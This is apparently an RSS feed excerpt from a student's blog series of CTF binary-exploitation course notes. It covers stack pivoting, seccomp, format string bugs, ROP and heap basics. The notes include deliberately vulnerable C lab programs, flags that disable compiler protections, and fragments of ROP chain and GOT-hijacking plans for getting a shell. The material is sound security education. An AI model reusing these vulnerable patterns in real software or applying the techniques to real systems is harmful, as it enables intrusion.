&lt;li>&lt;code>p64(pop_rdx_rbx_ret) + p64(0)*2 + p64(pop_rsi_ret) + p64(0)&lt;/code> is what we did in &lt;a href="https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/rki3GF0cs">last lecture&lt;/a> of &lt;code>ROP&lt;/code>&lt;/li>
&lt;li>&lt;code>p64(libc+0xebcf8)&lt;/code> is the one_gadget that we choose at the beginning.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Finally, we got shell!!!
&lt;img src="https://imgur.com/iIETaBy.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://shengyu7697.github.io/linux-ldd/">Linux ldd 查看執行檔執行時需要哪些 library&lt;/a>
&lt;a href="https://youtu.be/ktoVQB99Gj4">Pwn week1&lt;/a>&lt;/p></description></item><item><title>Simple PWN - 0x09(stack pivoting)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x09stack-pivoting/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x09stack-pivoting/</guid><description>&lt;h1 id="simple-pwn---0x09stack-pivoting">
 Simple PWN - 0x09(stack pivoting)
 &lt;a class="anchor" href="#simple-pwn---0x09stack-pivoting">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;h2 id="stack-pivoting-background">
 Stack Pivoting background
 &lt;a class="anchor" href="#stack-pivoting-background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/iA4Hrr17ooI?t=6865">NTUSTISC - Pwn Basic 3 [2019.03.26]&lt;/a>
&lt;a href="https://youtu.be/ktoVQB99Gj4?t=7898">Pwn week1&lt;/a>
It was used when stack overflow bytes not big enough to access a shellcode but it has another lots of writable space can be accessed.
More detailed info. can refer to &lt;a href="https://youtu.be/5D7tvxpSUUM?t=9543">Binary Exploitation (Pwn)&lt;/a>&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

char name[0x80]

int main()
{
 setvbuf(stdin, 0, _IONBF, 0);
 setvbuf(stdout, 0, _IONBF, 0);

 char s[0x10];

 printf(&amp;#34;Give me your name: &amp;#34;);
 read(0, name, 0x80);

 printf(&amp;#34;Give me your ROP: &amp;#34;);
 read(0, s, 0x20);

 return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>You can observe that it has not much stack buffer overflow can use, but it has global variable &lt;code>name&lt;/code> with space &lt;code>0x80&lt;/code>(can be another stack)
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">gcc -o stack_pivoting stack_pivoting.c -no-pie -fno-stack-protector -z norelro -zexecstack -static
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>&lt;font color="FF0000">Note that&lt;/font>:
must use &lt;code>mprotect&lt;/code> to change permission of global variable &lt;code>name&lt;/code> just like &lt;a href="https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/HJhgXGKci">lecture 0x04&lt;/a>, add these line in original code
&lt;pre tabindex="0">&lt;code class="language-c!" data-lang="c!">#include &amp;lt;sys/mman.h&amp;gt;
mprotect(0x403000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC);
&lt;/code>&lt;/pre>&lt;strong>Before &lt;code>mprotect&lt;/code> - &lt;code>vmmap&lt;/code>&lt;/strong>
&lt;img src="https://imgur.com/z8cK5SM.png" alt="" />
&lt;img src="https://imgur.com/J6qKJ8N.png" alt="" />
&lt;strong>After &lt;code>mprotect&lt;/code> - &lt;code>vmmap&lt;/code>&lt;/strong>
&lt;img src="https://imgur.com/gNr8Fya.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Construct &lt;code>ROP&lt;/code> chain&lt;/p></description></item><item><title>Simple PWN - 0x10(`seccomp`/Lab - `rop2win`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x10seccomp_lab---rop2win/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x10seccomp_lab---rop2win/</guid><description>&lt;h1 id="simple-pwn---0x10seccomplab---rop2win">
 Simple PWN - 0x10(&lt;code>seccomp&lt;/code>/Lab - &lt;code>rop2win&lt;/code>)
 &lt;a class="anchor" href="#simple-pwn---0x10seccomplab---rop2win">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>challenge: &lt;code>nc edu-ctf.zoolab.org 10005&lt;/code>&lt;/p>
&lt;h2 id="seccomp-background">
 &lt;code>seccomp&lt;/code> background
 &lt;a class="anchor" href="#seccomp-background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/ktoVQB99Gj4?t=8457">Pwn week1&lt;/a>&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;seccomp.h&amp;gt;

char fn[0x20];
char ROP[0x100];


// fd = open(&amp;#34;flag&amp;#34;, 0);
// read(fd, buf, 0x30);
// write(1, buf, 0x30); // 1 --&amp;gt; stdout

int main()
{
 setvbuf(stdin, 0, _IONBF, 0);
 setvbuf(stdout, 0, _IONBF, 0);

 scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
 seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
 seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
 seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
 seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
 seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
 seccomp_load(ctx);
 seccomp_release(ctx);

 printf(&amp;#34;Give me filename: &amp;#34;);
 read(0, fn, 0x20);

 printf(&amp;#34;Give me ROP: &amp;#34;);
 read(0, ROP, 0x100);

 char overflow[0x10];
 printf(&amp;#34;Give me overflow: &amp;#34;);
 read(0, overflow, 0x30);

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN - 0x11(format string bug)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x11format-string-bug/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x11format-string-bug/</guid><description>&lt;h1 id="simple-pwn---0x11format-string-bug">
 Simple PWN - 0x11(format string bug)
 &lt;a class="anchor" href="#simple-pwn---0x11format-string-bug">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;h2 id="format-string-bug-background">
 format string bug background
 &lt;a class="anchor" href="#format-string-bug-background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.geeksforgeeks.org/g-fact-31/">printf %n&lt;/a>
&lt;img src="https://media.geeksforgeeks.org/wp-content/cdn-uploads/20191009172738/n-in-printf.jpg" alt="" />&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

int main()
{
 setvbuf(stdin, 0, _IONBF, 0);
 setvbuf(stdout, 0, _IONBF, 0);

 char fmt[0x20];

 system(&amp;#34;echo &amp;#39;Give me fmt: &amp;#39;&amp;#34;);
 read(0, fmt, 0x20);
 printf(fmt);

 system(&amp;#34;echo &amp;#39;Give me string: &amp;#39;&amp;#34;);
 read(0, fmt, 0x20);
 puts(fmt);

 return 0;
}
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ gcc -o fmt fmt.c -no-pie -fno-stack-protector -z norelro -zexecstack
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>In this problem, we can consider to use &lt;code>format string bug&lt;/code> to achieve &lt;code>GOT hijacking&lt;/code> without buffer overflow.&lt;/li>
&lt;li>&lt;strong>The main idea is totally the same as &lt;a href="https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/S1BBpSR5s">GOT hijacking lecture&lt;/a>&lt;/strong>&lt;/li>
&lt;li>Thus, we can observe which function can be overlapped by &lt;code>system plt&lt;/code> → &lt;font color="FF0000">&lt;strong>&lt;code>puts function&lt;/code>&lt;/strong>&lt;/font>
&lt;ul>
&lt;li>Because&amp;hellip;
&lt;code>puts&lt;/code> just needs one argument like &lt;code>system&lt;/code> function, but how about &lt;code>printf&lt;/code>?
Unfortunately, it appeared before 2nd read function, because 2nd &lt;code>read&lt;/code> needs to store the argument for &lt;code>system&lt;/code> function such as &lt;code>sh\x00&lt;/code>.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="exploit---got-hijacking--format-string-bug">
 Exploit - GOT hijacking + format string bug
 &lt;a class="anchor" href="#exploit---got-hijacking--format-string-bug">#&lt;/a>
&lt;/h2>
&lt;p>&lt;strong>Our goal is hijack &lt;code>puts GOT&lt;/code> to &lt;code>system plt&lt;/code>&lt;/strong>&lt;/p></description></item><item><title>Simple PWN - 0x12(Lab - `rop++`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x12lab---rop++/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x12lab---rop++/</guid><description>&lt;h1 id="simple-pwn---0x12lab---rop">
 Simple PWN - 0x12(Lab - &lt;code>rop++&lt;/code>)
 &lt;a class="anchor" href="#simple-pwn---0x12lab---rop">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>challenge: &lt;code>nc edu-ctf.zoolab.org 10004&lt;/code>&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main()
{
 char buf[0x10];
 const char *msg = &amp;#34;show me rop\n&amp;gt; &amp;#34;;

 write(1, msg, strlen(msg));
 read(0, buf, 0x200);

 return 0;
}
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-makefile!" data-lang="makefile!">gcc -fno-stack-protector -static -o chal rop++.c
&lt;/code>&lt;/pre>&lt;h2 id="analyze">
 Analyze
 &lt;a class="anchor" href="#analyze">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>Obviously buffer overflow!!!&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Check protector&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ checksec chal
[*] &amp;#39;/home/sbk6401/NTUCS/PWN/Lab/rop++/share/chal&amp;#39;
 Arch: amd64-64-little
 RELRO: Partial RELRO
 Stack: Canary found
 NX: NX enabled
 PIE: No PIE (0x400000)
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>Preliminary idea is using &lt;code>ROP&lt;/code> chain and get shell, but the problem is where can I write &lt;code>/bin/sh\x00&lt;/code>? We can use &lt;code>vmmap&lt;/code> to observe where section is writable and readable → &lt;code>0x4c5000~0x4c800&lt;/code>
&lt;img src="https://imgur.com/018Nk8F.png" alt="" />&lt;/p></description></item><item><title>Simple PWN - 0x13(Lab - `how2know`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x13lab---how2know/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x13lab---how2know/</guid><description>&lt;h1 id="simple-pwn---0x13lab---how2know">
 Simple PWN - 0x13(Lab - &lt;code>how2know&lt;/code>)
 &lt;a class="anchor" href="#simple-pwn---0x13lab---how2know">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>challenge: &lt;code>nc edu-ctf.zoolab.org 10002&lt;/code>
Environment Version: 22.04&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;seccomp.h&amp;gt;
#include &amp;lt;sys/mman.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

static char flag[0x30];

int main()
{
 void *addr;
 int fd;
 scmp_filter_ctx ctx;

 addr = mmap(NULL, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
 if ((unsigned long)addr == -1)
 perror(&amp;#34;mmap&amp;#34;), exit(1);
 
 fd = open(&amp;#34;/home/chal/flag&amp;#34;, O_RDONLY);
 if (fd == -1)
 perror(&amp;#34;open&amp;#34;), exit(1);
 read(fd, flag, 0x30);
 close(fd);

 write(1, &amp;#34;talk is cheap, show me the code\n&amp;#34;, 33);
 read(0, addr, 0x1000);

 ctx = seccomp_init(SCMP_ACT_KILL);
 seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
 seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
 seccomp_load(ctx);
 seccomp_release(ctx);

 ((void(*)())addr)();

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN - 0x14(Simple HEAP)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x14simple-heap/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x14simple-heap/</guid><description>&lt;h1 id="simple-pwn---0x14simple-heap">
 Simple PWN - 0x14(Simple HEAP)
 &lt;a class="anchor" href="#simple-pwn---0x14simple-heap">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="heap-background">
 HEAP background
 &lt;a class="anchor" href="#heap-background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/rMqvL9j0QaM">Advanced Binary Exploitation (Pwn) - Heap Exploitation&lt;/a>
&lt;a href="https://youtu.be/Xppj8lA04qQ">SS111-Pwn2&lt;/a>&lt;/p>
&lt;h2 id="allocate-a-memory">
 Allocate a memory
 &lt;a class="anchor" href="#allocate-a-memory">#&lt;/a>
&lt;/h2>
&lt;h3 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h3>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

int main()
{
 void *ptr;
 ptr = malloc(0x30);
 return 0;
}
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ sudo gcc -o simple_heap simple_heap.c -no-pie
&lt;/code>&lt;/pre>&lt;h3 id="analyze">
 Analyze
 &lt;a class="anchor" href="#analyze">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>Before executing &lt;code>malloc&lt;/code>, there is no &lt;code>heap&lt;/code> space in memory layout
&lt;img src="https://imgur.com/h9ibSyk.png" alt="" />&lt;/p></description></item><item><title>Simple PWN - 0x15(Lab - `heapmath`)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x15lab---heapmath/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn---0x15lab---heapmath/</guid><description>&lt;h1 id="simple-pwn---0x15lab---heapmath">
 Simple PWN - 0x15(Lab - &lt;code>heapmath&lt;/code>)
 &lt;a class="anchor" href="#simple-pwn---0x15lab---heapmath">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;time.h&amp;gt;

int main()
{
 setvbuf(stdin, 0, _IONBF, 0);
 setvbuf(stdout, 0, _IONBF, 0);
 srand(time(NULL));

 void *tcache_chk[7] = {0};
 unsigned char tcachebin[3][7] = {0}; // 0x20, 0x30, 0x40
 unsigned int tcachebin_counts[4] = {0};
 unsigned long tcache_size[7] = {0};
 unsigned long tcache_free_order[7] = {0};

 puts(&amp;#34;----------- ** tcache chall ** -----------&amp;#34;);
 unsigned long tmp = 0;
 for (int i = 0; i &amp;lt; 7; i++) {
 tmp = (rand() % 0x21) + 0x10; // 0x10 ~ 0x30
 tcache_size[i] = tmp;
 }

 for (int i = 0; i &amp;lt; 7; i++) {
 repeat:
 tmp = rand() % 7;
 for (int j = 0; j &amp;lt; i; j++)
 if (tmp == tcache_free_order[j]) goto repeat;
 tcache_free_order[i] = tmp;
 }

 for (int i = 0; i &amp;lt; 7; i++) {
 tcache_chk[i] = malloc( tcache_size[i] );
 printf(&amp;#34;char *%c = (char *) malloc(0x%lx);\n&amp;#34;, &amp;#39;A&amp;#39; + i, tcache_size[i]);
 }

 for (int i = 0; i &amp;lt; 7; i++) {
 int idx = tcache_free_order[i];
 free(tcache_chk[ idx ]);
 printf(&amp;#34;free(%c);\n&amp;#34;, &amp;#39;A&amp;#39; + (unsigned char) idx);

 tmp = tcache_size[ idx ] - 0x8;
 if (tmp % 0x10)
 tmp = (tmp &amp;amp; ~0xf) + 0x20;
 else
 tmp += 0x10;

 unsigned int binidx = ((tmp - 0x20) / 0x10);
 unsigned int bincnt = tcachebin_counts[ binidx ];
 tcachebin[ binidx ][ bincnt ] = &amp;#39;A&amp;#39; + (unsigned char) idx;
 tcachebin_counts[ binidx ]++;
 }

 char tmpbuf[0x100] = {0};
 char ansbuf[3][0x100] = {0};
 for (int i = 0; i &amp;lt; 3; i++) {
 for (int j = 6; j &amp;gt;= 0; j--)
 if (tcachebin[i][j]) {
 sprintf(tmpbuf, &amp;#34;%c --&amp;gt; &amp;#34;, tcachebin[i][j]);
 strcat(ansbuf[i], tmpbuf);
 }
 strcat(ansbuf[i], &amp;#34;NULL&amp;#34;);
 }
 puts(&amp;#34;&amp;#34;);
 for (int i = 0; i &amp;lt; 3; i++) {
 printf(&amp;#34;[chunk size] 0x%x: &amp;#34;, (i+2) * 0x10);
 if (i == 0) {
 printf(&amp;#34;%s\t(just send \&amp;#34;%s\&amp;#34;)\n&amp;#34;, ansbuf[i], ansbuf[i]);
 } else {
 printf(&amp;#34;?\n&amp;gt; &amp;#34;);
 fgets(tmpbuf, 0x100, stdin);
 if (!strncmp(tmpbuf, ansbuf[i], strlen(ansbuf[i]))) {
 puts(&amp;#34;Correct !&amp;#34;);
 } else {
 puts(&amp;#34;Wrong !&amp;#34;);
 printf(&amp;#34;Ans: \&amp;#34;%s\&amp;#34;\n&amp;#34;, ansbuf[i]);
 exit(0);
 }
 }
 }

 puts(&amp;#34;\n----------- ** address chall ** -----------&amp;#34;);
 int cmp1 = 0;
 int cmp2 = 0;
 unsigned long ans_addr = 0;

 cmp1 = rand() % 7;
 while ((cmp2 = rand() % 7) == cmp1);
 if (cmp1 &amp;gt; cmp2) {
 tmp = cmp1;
 cmp1 = cmp2;
 cmp2 = tmp;
 }

 printf(&amp;#34;assert( %c == %p );\n&amp;#34;, &amp;#39;A&amp;#39; + cmp1, tcache_chk[ cmp1 ]);
 printf(&amp;#34;%c == ?\t(send as hex format, e.g. \&amp;#34;%p\&amp;#34;)\n&amp;gt; &amp;#34;,
 &amp;#39;A&amp;#39; + cmp2, tcache_chk[ cmp1 ]);
 scanf(&amp;#34;%s&amp;#34;, tmpbuf);
 ans_addr = strtoul(tmpbuf, NULL, 16);

 if (ans_addr == (unsigned long) tcache_chk[ cmp2 ]) {
 puts(&amp;#34;Correct !&amp;#34;);
 } else {
 puts(&amp;#34;Wrong !&amp;#34;);
 printf(&amp;#34;Ans: %p\n&amp;#34;, tcache_chk[ cmp2 ]);
 exit(0);
 }

 puts(&amp;#34;\n----------- ** index chall ** -----------&amp;#34;);
 unsigned long *fastbin[2] = {0};
 unsigned long fastbin_size = 0;
 unsigned long secret_idx = 0, result_idx = 0, res = 0;

 fastbin_size = (rand() % 0x31) + 0x40; // 0x40 ~ 0x70
 fastbin_size &amp;amp;= ~0xf;
 fastbin[0] = (unsigned long *) malloc( fastbin_size );
 fastbin[1] = (unsigned long *) malloc( fastbin_size );
 
 printf(&amp;#34;unsigned long *%c = (unsigned long *) malloc(0x%lx);\n&amp;#34;, &amp;#39;X&amp;#39;, fastbin_size);
 printf(&amp;#34;unsigned long *%c = (unsigned long *) malloc(0x%lx);\n&amp;#34;, &amp;#39;Y&amp;#39;, fastbin_size);

 secret_idx = rand() % (fastbin_size / 8);
 fastbin[1][ secret_idx ] = 0xdeadbeef;
 result_idx = ((unsigned long)(&amp;amp;fastbin[1][ secret_idx ]) - (unsigned long)(&amp;amp;fastbin[0][0])) / 8;
 
 printf(&amp;#34;Y[%lu] = 0xdeadbeef;\n&amp;#34;, secret_idx);
 printf(&amp;#34;X[?] == 0xdeadbeef\t(just send an integer, e.g. \&amp;#34;8\&amp;#34;)\n&amp;gt; &amp;#34;);
 scanf(&amp;#34;%lu&amp;#34;, &amp;amp;res);

 if (fastbin[0][res] == 0xdeadbeef) {
 puts(&amp;#34;Correct !&amp;#34;);
 } else {
 puts(&amp;#34;Wrong !&amp;#34;);
 printf(&amp;#34;Ans: %lu\n&amp;#34;, result_idx);
 exit(0);
 }

 puts(&amp;#34;\n----------- ** tcache fd chall ** -----------&amp;#34;);
 free(fastbin[0]);
 free(fastbin[1]);
 printf(&amp;#34;free(X);\nfree(Y);\nassert( Y == %p );\n&amp;#34;, fastbin[1]);
 printf(&amp;#34;fd of Y == ?\t(send as hex format, e.g. \&amp;#34;%p\&amp;#34;)\n&amp;gt; &amp;#34;, fastbin[1]);
 scanf(&amp;#34;%s&amp;#34;, tmpbuf);
 ans_addr = strtoul(tmpbuf, NULL, 16);

 if (ans_addr == *fastbin[1]) {
 puts(&amp;#34;Correct !&amp;#34;);
 } else {
 puts(&amp;#34;Wrong !&amp;#34;);
 printf(&amp;#34;Ans: 0x%lx\n&amp;#34;, *fastbin[1]);
 exit(0);
 }

 puts(&amp;#34;\n----------- ** fastbin fd chall (final) ** -----------&amp;#34;);
 puts(&amp;#34;[*] Restore the chunk to X and Y&amp;#34;);
 printf(&amp;#34;%c = (unsigned long *) malloc(0x%lx);\n&amp;#34;, &amp;#39;Y&amp;#39;, fastbin_size);
 printf(&amp;#34;%c = (unsigned long *) malloc(0x%lx);\n&amp;#34;, &amp;#39;X&amp;#39;, fastbin_size);
 fastbin[1] = malloc(fastbin_size);
 fastbin[0] = malloc(fastbin_size);
 printf(&amp;#34;[*] Do something to fill up 0x%lx tcache\n...\n[*] finish\n&amp;#34;, fastbin_size + 0x10);
 void *tmpchk[7];
 for (int i = 0; i &amp;lt; 7; i++)
 tmpchk[i] = malloc(fastbin_size);
 for (int i = 0; i &amp;lt; 7; i++)
 free(tmpchk[i]);
 printf(&amp;#34;free(X);\nfree(Y);\nassert( Y == %p );\n&amp;#34;, fastbin[1]);
 free(fastbin[0]);
 free(fastbin[1]);
 printf(&amp;#34;fd of Y == ?\t(send as hex format, e.g. \&amp;#34;%p\&amp;#34;)\n&amp;gt; &amp;#34;, fastbin[1]);
 scanf(&amp;#34;%s&amp;#34;, tmpbuf);
 ans_addr = strtoul(tmpbuf, NULL, 16);

 if (ans_addr == *fastbin[1]) {
 puts(&amp;#34;Correct !&amp;#34;);
 memset(tmpbuf, 0, 0x31);
 
 int fd = open(&amp;#34;/home/heapmath/flag&amp;#34;, O_RDONLY);
 read(fd, tmpbuf, 0x30);
 close(fd);
 printf(&amp;#34;Here is your flag: %s\n&amp;#34;, tmpbuf);
 } else {
 puts(&amp;#34;Wrong !&amp;#34;);
 printf(&amp;#34;Ans: 0x%lx\n&amp;#34;, *fastbin[1]);
 exit(0);
 }
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x16(simple_smallbin)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x16simple_smallbin/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x16simple_smallbin/</guid><description>&lt;h1 id="simple-pwn-0x16simple_smallbin">
 Simple PWN 0x16(simple_smallbin)
 &lt;a class="anchor" href="#simple-pwn-0x16simple_smallbin">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;p>Version: Ubuntu 20.04&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;img src="https://imgur.com/teWNhbh.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://imgur.com/kCTN7cs.png" alt="" />&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!=" data-lang="cpp!=">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

int main()
{
 void *ptrs[7];
 void *smallbin;
 int i;

 for (i = 0; i &amp;lt; 7; i++)
 ptrs[i] = malloc(0x108); // 0x110 chunk size

 smallbin = malloc(0x108);
 malloc(0x18);

 // aim to fill up tcache
 while(i)
 free(ptrs[--i]);
 
 free(smallbin);
 // trigger unsorted bin dispatch
 malloc(0x870);

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple PWN 0x17(UAF - leak information)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x17uaf---leak-information/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-pwn-0x17uaf---leak-information/</guid><description>&lt;h1 id="simple-pwn-0x17uaf---leak-information">
 Simple PWN 0x17(UAF - leak information)
 &lt;a class="anchor" href="#simple-pwn-0x17uaf---leak-information">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
